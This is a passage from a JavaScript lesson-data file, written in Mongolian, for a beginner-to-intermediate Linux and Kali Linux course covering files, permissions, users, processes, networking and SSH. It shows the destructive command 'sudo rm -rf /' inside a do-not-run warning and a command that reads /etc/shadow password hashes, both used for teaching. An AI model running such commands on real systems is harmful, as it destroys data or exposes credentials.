import { ANHAN } from './lvl_anhan.js';
import { DUND } from './lvl_dund.js';
import { AHLAH } from './lvl_ahlah.js';
/* ============================================================
   levels.js — Түвшин тус бүрийн дэлгэрэнгүй хичээлүүд
   Анхан шат (30) · Дунд шат (30) · Ахлах шат (30) = 90 хичээл

   block types (lessons.js-тэй ижил):
     p · h · list · cmd{cmd,out?} · note · warn
   ============================================================ */

/* ============================================================
   АНХАН ШАТ — 30 хичээл (Линукс үндэс, тэг мэдлэгээс)
   ============================================================ */
const ANHAN_SHORT = [
  {
    id: 'b01', title: 'Линукс гэж юу вэ?', level: 'Анхан шат',
    summary: 'Үйлдлийн систем, kernel, distro ойлголтууд.',
    blocks: [
      { type: 'p', text: 'Үйлдлийн систем (OS) бол компьютерийн техник хангамж болон програмуудыг холбож ажиллуулдаг үндсэн програм юм. Windows, macOS-той адил Linux ч мөн үйлдлийн систем.' },
      { type: 'p', text: 'Linux-ийн зүрх нь kernel (цөм) бөгөөд энэ нь санах ой, процессор, төхөөрөмжүүдийг удирддаг. Kernel дээр нэмэлт програмууд нэмж "distro" буюу бүрэн хувилбар үүсгэдэг.' },
      { type: 'list', items: [
        'Үнэгүй, нээлттэй эх кодтой',
        'Сервер, гар утас (Android), supercomputer-т зонхилдог',
        'Аюулгүй, тогтвортой, тохируулга өргөн',
      ] },
      { type: 'note', text: 'Бид Kali Linux хувилбарыг ашиглана. Энэ нь кибер аюулгүй байдалд зориулагдсан Debian суурьтай distro.' },
    ],
  },
  {
    id: 'b02', title: 'Kali Linux ба виртуал машин', level: 'Анхан шат',
    summary: 'Kali-г аюулгүйгээр туршиж сурах орчин.',
    blocks: [
      { type: 'p', text: 'Kali Linux нь нэвтрэлтийн тест, аюулгүй байдлын шинжилгээнд зориулсан 600 гаруй хэрэгсэлтэй distro. Сурахдаа үндсэн компьютер дээрээ биш, виртуал машин (VM) дотор ажиллуулах нь зөв.' },
      { type: 'h', text: 'Яагаад виртуал машин?' },
      { type: 'list', items: [
        'Үндсэн системээ эвдэхгүй — тусгаарлагдсан',
        'Snapshot аваад буцааж сэргээж болно',
        'VirtualBox (үнэгүй) эсвэл VMware ашиглана',
      ] },
      { type: 'note', text: 'Энэ вэб дэх "terminal нээх" хэсэг нь жинхэнэ системгүйгээр командуудыг турших боломж олгоно.' },
    ],
  },
  {
    id: 'b03', title: 'Ширээний орчин ба бүтэц', level: 'Анхан шат',
    summary: 'Kali-ийн GUI, цонх, цэсүүдтэй танилцах.',
    blocks: [
      { type: 'p', text: 'Kali нь анхдагчаар XFCE ширээний орчинтой. Дээд талын самбараас програмын цэс, terminal, файл менежер зэргийг нээнэ.' },
      { type: 'list', items: [
        'Applications цэс — бүх хэрэгсэл ангиллаар',
        'Files — график файл менежер',
        'Terminal Emulator — командын мөр (хамгийн чухал)',
      ] },
      { type: 'p', text: 'Гэхдээ Linux-ийн жинхэнэ хүч нь терминалд оршдог тул бид голчлон терминалаар ажиллана.' },
    ],
  },
  {
    id: 'b04', title: 'Терминал нээх ба prompt унших', level: 'Анхан шат',
    summary: 'Командын мөр, prompt-ийн утга.',
    blocks: [
      { type: 'p', text: 'Терминал бол текстээр тушаал өгдөг цонх. Kali дээр prompt дараах хэлбэртэй:' },
      { type: 'cmd', cmd: '' },
      { type: 'p', text: 'kali — нэвтэрсэн хэрэглэгч, дараагийн kali — компьютерийн нэр, [~] — одоогийн хавтас (гэрийн хавтас), $ — энгийн хэрэглэгч (root бол #).' },
      { type: 'cmd', cmd: 'whoami', out: 'kali' },
      { type: 'note', text: 'Команд бичээд Enter дарна. Олон команд гаралтгүй — энэ нь амжилттай гэсэн үг.' },
    ],
  },
  {
    id: 'b05', title: 'Эхний командууд', level: 'Анхан шат',
    summary: 'whoami, date, echo, hostname.',
    blocks: [
      { type: 'cmd', cmd: 'whoami', out: 'kali' },
      { type: 'cmd', cmd: 'hostname', out: 'kali' },
      { type: 'cmd', cmd: 'date', out: 'Tue Jun 30 14:00:00 +08 2026' },
      { type: 'h', text: 'echo — текст хэвлэх' },
      { type: 'cmd', cmd: 'echo "Сайн уу, Linux"', out: 'Сайн уу, Linux' },
      { type: 'note', text: 'echo нь дэлгэцэнд текст гаргадаг. Дараа нь скрипт бичихэд их хэрэглэгдэнэ.' },
    ],
  },
  {
    id: 'b06', title: 'Файлын системийн бүтэц', level: 'Анхан шат',
    summary: '/, /home, /etc, /var зэрэг үндсэн хавтсууд.',
    blocks: [
      { type: 'p', text: 'Linux-д бүх зүйл / (root) хавтаснаас эхэлдэг нэгдсэн мод бүтэцтэй. Windows шиг C:, D: гэж салаагүй.' },
      { type: 'list', items: [
        '/        — хамгийн дээд хавтас',
        '/home    — хэрэглэгчдийн хувийн файл (/home/kali)',
        '/etc     — системийн тохиргооны файлууд',
        '/var     — лог, өөрчлөгддөг өгөгдөл',
        '/usr     — суусан програмууд',
        '/tmp     — түр зуурын файл',
      ] },
      { type: 'cmd', cmd: 'ls /', out: 'bin  etc  home  root  tmp  usr  var' },
    ],
  },
  {
    id: 'b07', title: 'pwd ба ls — хаана байна, юу байна', level: 'Анхан шат',
    summary: 'Одоогийн байршил, доторх зүйлсийг харах.',
    blocks: [
      { type: 'h', text: 'pwd — Print Working Directory' },
      { type: 'cmd', cmd: 'pwd', out: '/home/kali' },
      { type: 'h', text: 'ls — List' },
      { type: 'cmd', cmd: 'ls', out: 'Desktop  Documents  Downloads  Pictures' },
      { type: 'note', text: 'pwd нь "би одоо хаана байна?", ls нь "энд юу байна?" гэсэн асуултад хариулна.' },
    ],
  },
  {
    id: 'b08', title: 'ls-ийн тугууд', level: 'Анхан шат',
    summary: '-l, -a, -h тугуудаар дэлгэрэнгүй харах.',
    blocks: [
      { type: 'p', text: 'Командад "туг" (flag) нэмж зан төлөвийг өөрчилнө. ls-д:' },
      { type: 'cmd', cmd: 'ls -l', out: '-rw-r--r-- 1 kali kali  220 Jun 30 14:00 notes.txt\ndrwxr-xr-x 2 kali kali 4096 Jun 30 14:00 Documents' },
      { type: 'list', items: [
        '-l — дэлгэрэнгүй (эрх, эзэмшигч, хэмжээ, огноо)',
        '-a — нуугдсан файлууд (. -ээр эхэлсэн)',
        '-h — хэмжээг ойлгомжтой (KB, MB)',
      ] },
      { type: 'cmd', cmd: 'ls -lah' },
      { type: 'note', text: 'Тугуудыг нэгтгэж болно: -l -a -h = -lah.' },
    ],
  },
  {
    id: 'b09', title: 'cd — хавтсаар зорчих', level: 'Анхан шат',
    summary: 'Хавтас хооронд шилжих.',
    blocks: [
      { type: 'cmd', cmd: 'cd Documents' },
      { type: 'cmd', cmd: 'pwd', out: '/home/kali/Documents' },
      { type: 'list', items: [
        'cd ..  — нэг шат дээшээ',
        'cd ~   — гэрийн хавтас руу',
        'cd /   — root хавтас руу',
        'cd -   — өмнөх хавтас руу буцах',
        'cd     — (хоосон) гэрийн хавтас руу',
      ] },
      { type: 'note', text: 'Хавтасны нэрийг бичээд Tab дарвал автоматаар гүйцээнэ — алдаа багасна.' },
    ],
  },
  {
    id: 'b10', title: 'Үнэмлэхүй ба харьцангуй зам', level: 'Анхан шат',
    summary: 'Absolute vs relative path.',
    blocks: [
      { type: 'p', text: 'Зам (path) гэдэг нь файл/хавтасны байршил. Хоёр төрөл:' },
      { type: 'list', items: [
        'Үнэмлэхүй (absolute): /-ээс эхэлнэ. Жишээ: /home/kali/notes.txt',
        'Харьцангуй (relative): одоогийн хавтаснаас. Жишээ: Documents/file.txt',
      ] },
      { type: 'cmd', cmd: 'cat /etc/hostname', out: 'kali' },
      { type: 'p', text: '. = одоогийн хавтас, .. = эцэг хавтас, ~ = гэрийн хавтас.' },
      { type: 'cmd', cmd: 'ls ./Documents' },
    ],
  },
  {
    id: 'b11', title: 'mkdir — хавтас үүсгэх', level: 'Анхан шат',
    summary: 'Шинэ хавтас, орлуулсан хавтас үүсгэх.',
    blocks: [
      { type: 'cmd', cmd: 'mkdir tsalin' },
      { type: 'cmd', cmd: 'ls', out: 'Desktop  Documents  tsalin' },
      { type: 'h', text: 'Олон шатлалт хавтас нэг дор' },
      { type: 'cmd', cmd: 'mkdir -p ajil/2026/sar' },
      { type: 'note', text: '-p туг нь дунд хавтсууд байхгүй бол хамт үүсгэнэ.' },
    ],
  },
  {
    id: 'b12', title: 'touch — файл үүсгэх', level: 'Анхан шат',
    summary: 'Хоосон файл үүсгэх, цаг шинэчлэх.',
    blocks: [
      { type: 'cmd', cmd: 'touch temdeglel.txt' },
      { type: 'cmd', cmd: 'ls', out: 'temdeglel.txt' },
      { type: 'p', text: 'Олон файл нэг дор:' },
      { type: 'cmd', cmd: 'touch a.txt b.txt c.txt' },
      { type: 'note', text: 'touch нь байгаа файлын хандсан хугацааг шинэчилдэг, байхгүй бол шинээр үүсгэдэг.' },
    ],
  },
  {
    id: 'b13', title: 'cat — файл унших', level: 'Анхан шат',
    summary: 'Файлын агуулгыг дэлгэцэнд гаргах.',
    blocks: [
      { type: 'cmd', cmd: 'cat /etc/hostname', out: 'kali' },
      { type: 'p', text: 'Олон файлыг нэгтгэж харах:' },
      { type: 'cmd', cmd: 'cat a.txt b.txt' },
      { type: 'h', text: 'Мөрийн дугаартай' },
      { type: 'cmd', cmd: 'cat -n /etc/hosts' },
      { type: 'note', text: 'cat богино файлд тохиромжтой. Урт файлд less ашиглах нь дээр.' },
    ],
  },
  {
    id: 'b14', title: 'less, head, tail — урт файл', level: 'Анхан шат',
    summary: 'Урт файлыг хуудаслах, эхэн/төгсгөлийг харах.',
    blocks: [
      { type: 'cmd', cmd: 'less /etc/passwd' },
      { type: 'p', text: 'less дотор: сумаар гүйлгэх, / -ээр хайх, q -ээр гарах.' },
      { type: 'h', text: 'Эхний/сүүлийн мөрүүд' },
      { type: 'cmd', cmd: 'head -n 5 /etc/passwd' },
      { type: 'cmd', cmd: 'tail -n 5 /etc/passwd' },
      { type: 'note', text: 'tail -f нь лог файлыг бодит цагт ажиглахад маш хэрэгтэй (дунд шатанд үзнэ).' },
    ],
  },
  {
    id: 'b15', title: 'cp — хуулах', level: 'Анхан шат',
    summary: 'Файл, хавтас хуулах.',
    blocks: [
      { type: 'cmd', cmd: 'cp temdeglel.txt backup.txt' },
      { type: 'h', text: 'Хавтсыг бүхэлд нь' },
      { type: 'cmd', cmd: 'cp -r Documents Documents_backup' },
      { type: 'note', text: '-r (recursive) нь хавтсыг доторх бүх зүйлтэй нь хуулна. Хавтас хуулахад заавал хэрэгтэй.' },
    ],
  },
  {
    id: 'b16', title: 'mv — зөөх ба нэр солих', level: 'Анхан шат',
    summary: 'Файл зөөх болон нэрийг өөрчлөх.',
    blocks: [
      { type: 'h', text: 'Зөөх' },
      { type: 'cmd', cmd: 'mv backup.txt Documents/' },
      { type: 'h', text: 'Нэр солих' },
      { type: 'cmd', cmd: 'mv huuchin.txt shine.txt' },
      { type: 'note', text: 'mv-д тусдаа "rename" команд байхгүй — зөөх ба нэр солих нэг команд. Очих газар нь хавтас бол зөөнө, нэр бол нэр солино.' },
    ],
  },
  {
    id: 'b17', title: 'rm, rmdir — устгах', level: 'Анхан шат',
    summary: 'Файл, хавтас устгах ба болгоомжлол.',
    blocks: [
      { type: 'cmd', cmd: 'rm backup.txt' },
      { type: 'cmd', cmd: 'rm -r Documents_backup' },
      { type: 'warn', text: 'Linux-д хогийн сав байхгүй — rm устгасан зүйл буцаж ирэхгүй. Ялангуяа sudo rm -rf / гэх командыг ХЭЗЭЭ Ч бүү бич, систем бүхэлдээ устана.' },
      { type: 'note', text: 'rmdir зөвхөн хоосон хавтас устгана. Дотор зүйлтэй бол rm -r ашиглана.' },
    ],
  },
  {
    id: 'b18', title: 'nano — текст засварлагч', level: 'Анхан шат',
    summary: 'Терминал доторх энгийн засварлагч.',
    blocks: [
      { type: 'cmd', cmd: 'nano temdeglel.txt' },
      { type: 'p', text: 'nano нээгдээд шууд бичиж болно. Доод талд товчлуурууд харагдана (^ нь Ctrl).' },
      { type: 'list', items: [
        'Ctrl+O — хадгалах (дараа Enter)',
        'Ctrl+X — гарах',
        'Ctrl+K — мөр таслах, Ctrl+U — буулгах',
        'Ctrl+W — хайх',
      ] },
      { type: 'note', text: 'Илүү хүчтэй засварлагч vim байдаг ч эхлэхэд nano хангалттай.' },
    ],
  },
  {
    id: 'b19', title: 'Тусламж авах — man, --help', level: 'Анхан шат',
    summary: 'Командын баримтжуулалт унших.',
    blocks: [
      { type: 'p', text: 'Команд мартвал баримтжуулалтыг нь үзэж болно.' },
      { type: 'cmd', cmd: 'man ls' },
      { type: 'p', text: 'man дотор сумаар гүйлгэх, q-ээр гарна. Хурдан тусламж:' },
      { type: 'cmd', cmd: 'ls --help' },
      { type: 'cmd', cmd: 'whatis cat', out: 'cat (1) - concatenate files and print on the standard output' },
      { type: 'note', text: 'Програмист "бүгдийг цээжилдэггүй", харин man, --help, хайлтыг сайн ашигладаг.' },
    ],
  },
  {
    id: 'b20', title: 'Tab гүйцээлт ба түүх', level: 'Анхан шат',
    summary: 'Хурдан бичих, өмнөх командуудаа дуудах.',
    blocks: [
      { type: 'list', items: [
        'Tab — нэр (файл, команд)-ийг автоматаар гүйцээх',
        'Tab Tab — боломжит хувилбаруудыг харуулах',
        '↑ ↓ — өмнө бичсэн командуудаа гүйлгэх',
        'Ctrl+R — түүхээс хайх',
      ] },
      { type: 'cmd', cmd: 'history', out: '  1  pwd\n  2  ls\n  3  cd Documents' },
      { type: 'note', text: 'Tab гүйцээлт нь бичих хурдыг хэд дахин нэмэгдүүлж, алдааг бууруулна.' },
    ],
  },
  {
    id: 'b21', title: 'Wildcard тэмдэгтүүд', level: 'Анхан шат',
    summary: '*, ?, [] ашиглан олон файлд ажиллах.',
    blocks: [
      { type: 'p', text: 'Wildcard нь олон файлыг нэг загвараар сонгоход хэрэглэгдэнэ.' },
      { type: 'list', items: [
        '*  — дурын тооны тэмдэгт (*.txt = бүх .txt)',
        '?  — яг нэг тэмдэгт (file?.txt)',
        '[] — багц тэмдэгт ([abc].txt)',
      ] },
      { type: 'cmd', cmd: 'ls *.txt' },
      { type: 'cmd', cmd: 'rm temp_*' },
      { type: 'warn', text: 'rm-тэй wildcard хэрэглэхдээ болгоомжтой. Эхлээд ls-ээр юу сонгогдохыг шалга.' },
    ],
  },
  {
    id: 'b22', title: 'Хэрэглэгч ба sudo', level: 'Анхан шат',
    summary: 'Энгийн хэрэглэгч, root, sudo-ийн утга.',
    blocks: [
      { type: 'p', text: 'Linux нь олон хэрэглэгчтэй систем. root бол бүх эрхтэй админ. Энгийн хэрэглэгч системийн чухал зүйлд хүрэхийн тулд sudo ашиглана.' },
      { type: 'cmd', cmd: 'whoami', out: 'kali' },
      { type: 'cmd', cmd: 'sudo apt update' },
      { type: 'p', text: 'sudo бичээд эхний удаа нууц үг асууж магадгүй.' },
      { type: 'warn', text: 'sudo нь админ эрх олгоно. Юу хийж байгаагаа ойлгож байж л ашигла — буруу команд систем эвдэж болно.' },
    ],
  },
  {
    id: 'b23', title: 'Файлын эрхийг ойлгох', level: 'Анхан шат',
    summary: 'rwx, эзэмшигч/групп/бусад.',
    blocks: [
      { type: 'cmd', cmd: 'ls -l script.sh', out: '-rwxr-xr-- 1 kali kali 128 Jun 30 14:00 script.sh' },
      { type: 'p', text: 'Эхний тэмдэг: - файл, d хавтас. Дараагийн 9 нь 3 бүлэг эрх:' },
      { type: 'list', items: [
        'rwx (эзэмшигч) — унших/бичих/ажиллуулах',
        'r-x (групп) — унших/ажиллуулах',
        'r-- (бусад) — зөвхөн унших',
        'r=read, w=write, x=execute',
      ] },
      { type: 'note', text: 'Эрхийн ойлголт аюулгүй байдлын суурь. Дунд шатанд chmod-оор өөрчилнө.' },
    ],
  },
  {
    id: 'b24', title: 'chmod — эрх өөрчлөх (үндэс)', level: 'Анхан шат',
    summary: 'Файлыг ажиллуулах боломжтой болгох.',
    blocks: [
      { type: 'cmd', cmd: 'chmod +x script.sh' },
      { type: 'cmd', cmd: 'ls -l script.sh', out: '-rwxr-xr-x 1 kali kali 128 Jun 30 14:00 script.sh' },
      { type: 'p', text: 'Эрх хасах:' },
      { type: 'cmd', cmd: 'chmod -x script.sh' },
      { type: 'note', text: 'Скрипт бичээд ажиллуулахын тулд эхлээд +x эрх өгөх ёстой. Тоон хэлбэрийг (755) дунд шатанд үзнэ.' },
    ],
  },
  {
    id: 'b25', title: 'apt — програм суулгах', level: 'Анхан шат',
    summary: 'Debian/Kali-ийн багц менежер.',
    blocks: [
      { type: 'p', text: 'Linux-д програмыг ихэвчлэн багц менежерээр суулгана — exe татдаггүй.' },
      { type: 'cmd', cmd: 'sudo apt update' },
      { type: 'cmd', cmd: 'sudo apt install htop' },
      { type: 'cmd', cmd: 'sudo apt remove htop' },
      { type: 'note', text: 'Эхлээд apt update (жагсаалт шинэчлэх), дараа install. Шинэ систем дээр sudo apt update && sudo apt upgrade -y зөв дадал.' },
    ],
  },
  {
    id: 'b26', title: 'grep — текст хайх (үндэс)', level: 'Анхан шат',
    summary: 'Файл доторх үг/мөр хайх.',
    blocks: [
      { type: 'cmd', cmd: 'grep "root" /etc/passwd', out: 'root:x:0:0:root:/root:/usr/bin/zsh' },
      { type: 'p', text: 'Жижиг/том үсэг харгалзахгүй хайх:' },
      { type: 'cmd', cmd: 'grep -i "ROOT" /etc/passwd' },
      { type: 'note', text: 'grep бол Linux-ийн хамгийн их хэрэглэгддэг командуудын нэг. Дунд шатанд regex-тэй гүнзгийрүүлнэ.' },
    ],
  },
  {
    id: 'b27', title: 'find — файл хайх', level: 'Анхан шат',
    summary: 'Нэр, төрлөөр файл олох.',
    blocks: [
      { type: 'cmd', cmd: 'find /home -name "*.txt"', out: '/home/kali/notes.txt' },
      { type: 'p', text: 'Нэрийн хэсгээр (жижиг/том үсэг үл хамаарна):' },
      { type: 'cmd', cmd: 'find . -iname "doc*"' },
      { type: 'note', text: 'find <хаанаас> -name <загвар>. locate команд илүү хурдан ч өгөгдлийн сан шинэчлэх шаардлагатай.' },
    ],
  },
  {
    id: 'b28', title: 'Pipe ба redirection', level: 'Анхан шат',
    summary: '| , > , >> — командуудыг холбох.',
    blocks: [
      { type: 'h', text: 'Pipe (|) — нэг командын гаралтыг нөгөөд' },
      { type: 'cmd', cmd: 'cat /etc/passwd | grep kali' },
      { type: 'h', text: 'Redirection (>) — гаралтыг файл руу' },
      { type: 'cmd', cmd: 'ls -l > jagsaalt.txt' },
      { type: 'cmd', cmd: 'echo "нэмэлт мөр" >> jagsaalt.txt' },
      { type: 'note', text: '> файлыг дарж бичнэ, >> төгсгөлд нэмнэ. Pipe нь Linux-ийн хамгийн хүчтэй ойлголтуудын нэг.' },
    ],
  },
  {
    id: 'b29', title: 'Терминалын шуурхай товчлол', level: 'Анхан шат',
    summary: 'Хурдан ажиллах түлхүүрүүд.',
    blocks: [
      { type: 'list', items: [
        'Ctrl+C — ажиллаж буй командыг зогсоох',
        'Ctrl+L — дэлгэц цэвэрлэх (= clear)',
        'Ctrl+A / Ctrl+E — мөрийн эхэн / төгсгөл рүү',
        'Ctrl+U — мөрийг цэвэрлэх',
        'Ctrl+D — терминалаас гарах (exit)',
      ] },
      { type: 'cmd', cmd: 'clear' },
      { type: 'note', text: 'Эдгээр товчлолыг сурвал ажлын хурд эрс нэмэгдэнэ.' },
    ],
  },
  {
    id: 'b30', title: 'Анхан шатны давталт', level: 'Анхан шат',
    summary: 'Үндсэн командуудын тойм (cheat sheet).',
    blocks: [
      { type: 'p', text: 'Та одоо Linux-д чөлөөтэй зорчиж, файл удирдаж чадна. Үндсэн командуудыг сэргээe:' },
      { type: 'list', items: [
        'Зорчих: pwd, ls, cd',
        'Файл: mkdir, touch, cp, mv, rm, cat, less',
        'Засах: nano',
        'Хайх: grep, find',
        'Систем: sudo, apt, chmod, whoami',
        'Холбох: | , > , >>',
      ] },
      { type: 'note', text: 'Дараагийн "Дунд шат"-нд bash хувьсагч, процесс, сүлжээ, скрипт бичих зэргийг үзнэ. Командуудаа "terminal нээх" хэсэгт заавал турш!' },
    ],
  },
];

/* ============================================================
   ДУНД ШАТ — 30 хичээл (bash, систем, сүлжээ, скрипт)
   ============================================================ */
const DUND_SHORT = [
  {
    id: 'm01', title: 'Bash ба shell гэж юу вэ', level: 'Дунд шат',
    summary: 'Shell, bash, командын тайлбарлагчийн ойлголт.',
    blocks: [
      { type: 'p', text: 'Shell бол таны бичсэн командыг уншиж, kernel-д дамжуулдаг програм. Хамгийн түгээмэл нь bash, Kali-д анхдагч нь zsh.' },
      { type: 'cmd', cmd: 'echo $SHELL', out: '/usr/bin/zsh' },
      { type: 'cmd', cmd: 'bash --version', out: 'GNU bash, version 5.2' },
      { type: 'note', text: 'Скрипт бичихэд ихэвчлэн bash ашигладаг тул бид bash дээр төвлөрнө.' },
    ],
  },
  {
    id: 'm02', title: 'Environment хувьсагч', level: 'Дунд шат',
    summary: 'PATH, HOME, env, export.',
    blocks: [
      { type: 'p', text: 'Environment хувьсагч нь систем даяар хадгалагдах нэр-утга хосууд. $-ээр дуудна.' },
      { type: 'cmd', cmd: 'echo $HOME', out: '/home/kali' },
      { type: 'cmd', cmd: 'echo $PATH', out: '/usr/local/bin:/usr/bin:/bin' },
      { type: 'cmd', cmd: 'export MYVAR="сайн уу"' },
      { type: 'cmd', cmd: 'echo $MYVAR', out: 'сайн уу' },
      { type: 'note', text: 'PATH нь shell командыг хайх хавтсуудыг заана. Тиймээс ls гэхэд /usr/bin/ls олддог.' },
    ],
  },
  {
    id: 'm03', title: 'Alias ба .bashrc', level: 'Дунд шат',
    summary: 'Тогтмол командуудыг богиносгох.',
    blocks: [
      { type: 'p', text: 'Alias нь урт командад богино нэр өгнө.' },
      { type: 'cmd', cmd: "alias ll='ls -lah'" },
      { type: 'cmd', cmd: 'll' },
      { type: 'p', text: 'Байнга ашиглахын тулд ~/.bashrc файлд бичнэ:' },
      { type: 'cmd', cmd: 'echo "alias ll=\'ls -lah\'" >> ~/.bashrc' },
      { type: 'cmd', cmd: 'source ~/.bashrc' },
      { type: 'note', text: '.bashrc нь терминал нээх бүрт ажилладаг тохиргооны файл. source нь дахин ачаална.' },
    ],
  },
  {
    id: 'm04', title: 'chmod — тоон хэлбэр', level: 'Дунд шат',
    summary: 'r=4, w=2, x=1 — 755, 644.',
    blocks: [
      { type: 'p', text: 'Эрхийг тоогоор илэрхийлж болно: r=4, w=2, x=1. Нийлбэр нь нэг бүлгийн эрх.' },
      { type: 'list', items: [
        '7 = rwx (4+2+1)',
        '6 = rw- (4+2)',
        '5 = r-x (4+1)',
        '4 = r--',
      ] },
      { type: 'cmd', cmd: 'chmod 755 script.sh' },
      { type: 'cmd', cmd: 'ls -l script.sh', out: '-rwxr-xr-x 1 kali kali 128 Jun 30 14:00 script.sh' },
      { type: 'note', text: '755 = эзэмшигч бүгд, бусад унших+ажиллуулах. 644 = файлд түгээмэл, 600 = зөвхөн эзэмшигч.' },
    ],
  },
  {
    id: 'm05', title: 'chown, chgrp — эзэмшигч', level: 'Дунд шат',
    summary: 'Файлын эзэмшигч, группыг өөрчлөх.',
    blocks: [
      { type: 'cmd', cmd: 'sudo chown kali:kali file.txt' },
      { type: 'p', text: 'Зөвхөн групп солих:' },
      { type: 'cmd', cmd: 'sudo chgrp sudo file.txt' },
      { type: 'p', text: 'Хавтсыг доторх бүхэлд нь:' },
      { type: 'cmd', cmd: 'sudo chown -R kali:kali /var/www' },
      { type: 'note', text: 'chown user:group хэлбэртэй. -R нь рекурсив. Ихэвчлэн sudo шаардана.' },
    ],
  },
  {
    id: 'm06', title: 'Хэрэглэгч удирдах', level: 'Дунд шат',
    summary: 'useradd, passwd, su, id.',
    blocks: [
      { type: 'cmd', cmd: 'sudo useradd -m bayar' },
      { type: 'cmd', cmd: 'sudo passwd bayar' },
      { type: 'cmd', cmd: 'id bayar', out: 'uid=1001(bayar) gid=1001(bayar) groups=1001(bayar)' },
      { type: 'p', text: 'Өөр хэрэглэгч рүү шилжих:' },
      { type: 'cmd', cmd: 'su - bayar' },
      { type: 'note', text: '-m нь гэрийн хавтас үүсгэнэ. Хэрэглэгчид sudo эрх өгөхдөө sudo группт нэмнэ: usermod -aG sudo bayar.' },
    ],
  },
  {
    id: 'm07', title: '/etc/passwd ба /etc/shadow', level: 'Дунд шат',
    summary: 'Хэрэглэгчийн мэдээлэл хаана хадгалагддаг вэ.',
    blocks: [
      { type: 'cmd', cmd: 'cat /etc/passwd | tail -3' },
      { type: 'p', text: 'Мөр бүр: нэр:x:UID:GID:тайлбар:гэрийн хавтас:shell. x нь нууц үг /etc/shadow-д байгааг заана.' },
      { type: 'cmd', cmd: 'sudo cat /etc/shadow | tail -3' },
      { type: 'warn', text: '/etc/shadow дотор нууц үгийн hash байдаг тул зөвхөн root унших эрхтэй. Энэ файлыг хамгаалах нь чухал.' },
    ],
  },
  {
    id: 'm08', title: 'Процесс — ps, top, htop', level: 'Дунд шат',
    summary: 'Ажиллаж буй програмуудыг харах.',
    blocks: [
      { type: 'cmd', cmd: 'ps aux | head -5' },
      { type: 'cmd', cmd: 'ps aux | grep firefox' },
      { type: 'h', text: 'Бодит цагийн хяналт' },
      { type: 'cmd', cmd: 'top' },
      { type: 'cmd', cmd: 'sudo apt install htop' },
      { type: 'note', text: 'PID (процессын дугаар) нь дараагийн kill командад хэрэгтэй. top/htop дотор q-ээр гарна.' },
    ],
  },
  {
    id: 'm09', title: 'kill, signals, jobs', level: 'Дунд шат',
    summary: 'Процесс зогсоох, арын дэвсгэрт ажиллуулах.',
    blocks: [
      { type: 'cmd', cmd: 'kill 1234' },
      { type: 'cmd', cmd: 'kill -9 1234' },
      { type: 'p', text: 'Нэрээр нь устгах:' },
      { type: 'cmd', cmd: 'pkill firefox' },
      { type: 'h', text: 'Арын дэвсгэр' },
      { type: 'list', items: [
        'команд & — арын дэвсгэрт ажиллуулах',
        'Ctrl+Z — түр зогсоох',
        'jobs — жагсаах, fg — урагшлуулах, bg — ард үргэлжлүүлэх',
      ] },
      { type: 'note', text: 'kill -9 (SIGKILL) нь хатуу зогсооно. Эхлээд энгийн kill-ийг туршина.' },
    ],
  },
  {
    id: 'm10', title: 'systemctl — үйлчилгээ удирдах', level: 'Дунд шат',
    summary: 'Service эхлүүлэх, зогсоох, идэвхжүүлэх.',
    blocks: [
      { type: 'cmd', cmd: 'sudo systemctl start ssh' },
      { type: 'cmd', cmd: 'sudo systemctl status ssh' },
      { type: 'list', items: [
        'start / stop / restart — ажиллуулах/зогсоох',
        'enable / disable — ачаалахад автоматаар эхлэх эсэх',
        'status — төлөв харах',
      ] },
      { type: 'cmd', cmd: 'sudo systemctl enable ssh' },
      { type: 'note', text: 'systemd нь орчин үеийн Linux-ийн үйлчилгээ удирдах систем. mariadb, apache2 зэргийг ингэж удирдана.' },
    ],
  },
  {
    id: 'm11', title: 'Сүлжээ — ip, ifconfig', level: 'Дунд шат',
    summary: 'IP хаяг, интерфейс харах.',
    blocks: [
      { type: 'cmd', cmd: 'ip a' },
      { type: 'p', text: 'Зөвхөн IP-г шүүх:' },
      { type: 'cmd', cmd: 'ip a | grep inet' },
      { type: 'cmd', cmd: 'ifconfig' },
      { type: 'note', text: 'ip нь шинэ, ifconfig хуучин команд. eth0 = утсан, wlan0 = wifi интерфейс.' },
    ],
  },
  {
    id: 'm12', title: 'Холболт шалгах — ping, traceroute', level: 'Дунд шат',
    summary: 'Сүлжээний холболт, замыг шалгах.',
    blocks: [
      { type: 'cmd', cmd: 'ping -c 4 8.8.8.8' },
      { type: 'cmd', cmd: 'traceroute google.com' },
      { type: 'h', text: 'Нээлттэй холболтууд' },
      { type: 'cmd', cmd: 'ss -tuln' },
      { type: 'note', text: 'ping холболт байгаа эсэх, traceroute багц ямар замаар явахыг харуулна. ss/netstat нээлттэй портуудыг.' },
    ],
  },
  {
    id: 'm13', title: 'DNS — nslookup, dig, hosts', level: 'Дунд шат',
    summary: 'Домэйн нэр → IP хөрвүүлэлт.',
    blocks: [
      { type: 'cmd', cmd: 'nslookup example.com' },
      { type: 'cmd', cmd: 'dig example.com +short', out: '93.184.216.34' },
      { type: 'p', text: 'Локал нэр-IP харгалзуулалт:' },
      { type: 'cmd', cmd: 'cat /etc/hosts' },
      { type: 'note', text: 'DNS нь домэйн нэрийг IP болгон хувиргадаг. /etc/hosts нь DNS-ээс түрүүлж шалгагддаг локал жагсаалт.' },
    ],
  },
  {
    id: 'm14', title: 'SSH — алсын холболт', level: 'Дунд шат',
    summary: 'Өөр компьютерт аюулгүй холбогдох.',
    blocks: [
      { type: 'cmd', cmd: 'ssh kali@192.168.1.110' },
      { type: 'h', text: 'Түлхүүр үүсгэх (нууц үггүй холболт)' },
      { type: 'cmd', cmd: 'ssh-keygen -t ed25519' },
      { type: 'cmd', cmd: 'ssh-copy-id kali@192.168.1.110' },
      { type: 'note', text: 'SSH нь шифрлэгдсэн алсын холболт. Түлхүүр ашиглавал нууц үг бичихгүйгээр, илүү аюулгүй холбогдоно.' },
    ],
  },
  {
    id: 'm15', title: 'Файл дамжуулах — scp, rsync', level: 'Дунд шат',
    summary: 'Компьютер хооронд файл хуулах.',
    blocks: [
      { type: 'cmd', cmd: 'scp file.txt kali@192.168.1.110:/home/kali/' },
      { type: 'p', text: 'Хавтсыг бүхэлд нь:' },
      { type: 'cmd', cmd: 'scp -r myfolder kali@192.168.1.110:~/' },
      { type: 'h', text: 'rsync — ухаалаг синк' },
      { type: 'cmd', cmd: 'rsync -avz myfolder/ kali@192.168.1.110:~/backup/' },
      { type: 'note', text: 'scp энгийн хуулалт, rsync зөвхөн өөрчлөгдсөн хэсгийг дамжуулдаг тул том файлд хурдан.' },
    ],
  },
  {
    id: 'm16', title: 'Архив — tar, gzip, zip', level: 'Дунд шат',
